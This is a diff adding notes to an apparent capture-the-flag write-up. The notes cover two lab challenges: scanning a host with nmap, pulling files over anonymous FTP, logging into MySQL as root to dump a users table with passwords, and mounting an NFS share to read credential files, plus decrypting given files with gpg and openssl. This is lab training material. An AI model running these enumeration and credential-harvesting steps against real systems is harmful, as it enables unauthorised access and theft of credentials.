@@ -317,11 +317,66 @@ nl nice-list.txt
 ## Elf Applications
 
 ```shell
+#this involves exploiting application layer services
+nmap -T4 -p- -A 10.10.7.146
+
+ftp 10.10.7.146
+#using anonymous login
+#contains some files
+#includes credentials for mysql
+mget * #get all files to local system
+
+quit #quit ftp
+
+#connect to mysql using given creds
+mysql -h 10.10.7.146 -u root -p
+#prompts for password, enter given cred
+
+help
+
+show databases;
+#show all databases
+
+use data;
+#use data table
+
+show tables;
+
+select * from USERS;
+#show content of table
+#shows password
+
+quit
+
+#now we have to use nfs
+showmount -e 10.10.7.146
+
+sudo mount -t nfs 10.10.7.146:/ /mnt -o nolock
+
+cd /mnt
+
+ls
+#gives required creds files
 ```
 
 ## Elfcryption
 
 ```shell
+#this challenge is about encryption
+#we are given a zip file
+unzip tosend.zip
+
+#gives three files
+#we can read the gpg file using the passphrase '25daysofchristmas' given in the hint
+gpg -d note1.txt.gpg
+#Santa's Grotto
+
+#similarly, we can decrypt note2 using private.key given to us
+#and passphrase is 'hello' as given in hint
+openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2_plaintext.txt
+
+cat note2_plaintext.txt
+#gives flag
 ```
 
 ## Accumulate
